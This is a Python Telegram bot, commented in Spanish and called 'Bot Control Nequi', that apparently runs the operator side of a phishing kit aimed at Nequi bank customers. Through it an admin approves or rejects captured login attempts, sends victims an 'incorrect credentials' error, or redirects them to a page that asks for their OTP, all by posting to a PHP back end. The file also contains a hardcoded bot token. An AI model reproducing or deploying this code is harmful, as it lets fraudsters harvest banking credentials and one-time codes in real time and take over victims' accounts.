from telegram import Update
from telegram.ext import Application, MessageHandler, CommandHandler, ContextTypes, filters
import requests

BOT_TOKEN = "7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc"
ADMIN_CHAT_ID = "6958936698"  # ⚠️ CAMBIA ESTO
PHP_SERVER = "http://localhost/nequi"  # ⚠️ CAMBIA ESTO por tu URL local

async def comando_dinamico(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Maneja comandos /aprobar_XXX, /rechazar_XXX, /pedir_otp_XXX"""
    
    # Solo permitir al admin
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        return
    
    texto = update.message.text
    
    if texto.startswith('/aprobar_'):
        session_id = texto.replace('/aprobar_', '').strip()
        
        try:
            response = requests.post(
                f"{PHP_SERVER}/process/update_status.php",
                data={
                    'session_id': session_id,
                    'estado': 'aprobado'
                },
                timeout=5
            )
            
            if response.text == "OK":
                await update.message.reply_text(
                    f"✅ <b>Sesión APROBADA</b>\n"
                    f"🆔 {session_id}\n\n"
                    f"Usuario redirigido a /private/",
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(f"⚠️ Error: {response.text}")
        except Exception as e:
            await update.message.reply_text(f"❌ Error de conexión: {str(e)}")
    
    elif texto.startswith('/rechazar_'):
        session_id = texto.replace('/rechazar_', '').strip()
        
        try:
            response = requests.post(
                f"{PHP_SERVER}/process/update_status.php",
                data={
                    'session_id': session_id,
                    'estado': 'rechazado',
                    'mensaje': 'Credenciales incorrectas'
                },
                timeout=5
            )
            
            if response.text == "OK":
                await update.message.reply_text(
                    f"❌ <b>Sesión RECHAZADA</b>\n"
                    f"🆔 {session_id}\n\n"
                    f"Usuario verá error y será redirigido",
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(f"⚠️ Error: {response.text}")
        except Exception as e:
            await update.message.reply_text(f"❌ Error de conexión: {str(e)}")
    
    elif texto.startswith('/pedir_otp_'):
        session_id = texto.replace('/pedir_otp_', '').strip()
        
        try:
            response = requests.post(
                f"{PHP_SERVER}/process/update_status.php",
                data={
                    'session_id': session_id,
                    'estado': 'pedir_otp'
                },
                timeout=5
            )
            
            if response.text == "OK":
                await update.message.reply_text(
                    f"📱 <b>Solicitando OTP</b>\n"
                    f"🆔 {session_id}\n\n"
                    f"Usuario redirigido a página OTP",
                    parse_mode='HTML'
                )
            else:
                await update.message.reply_text(f"⚠️ Error: {response.text}")
        except Exception as e:
            await update.message.reply_text(f"❌ Error de conexión: {str(e)}")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 <b>Bot Control Nequi</b>\n\n"
        "Recibirás notificaciones cuando alguien intente hacer login.\n\n"
        "Simplemente haz clic en los comandos que aparecen en cada notificación.",
        parse_mode='HTML'
    )

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Manejar comandos dinámicos
    app.add_handler(MessageHandler(
        filters.Regex(r'^/(aprobar_|rechazar_|pedir_otp_)'), 
        comando_dinamico
    ))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("start", cmd_help))
    
    print("="*50)
    print("🤖 BOT DE TELEGRAM INICIADO")
    print("="*50)
    print(f"✅ Escuchando mensajes...")
    print(f"📱 Admin ID: {ADMIN_CHAT_ID}")
    print(f"🌐 Servidor PHP: {PHP_SERVER}")
    print("="*50)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
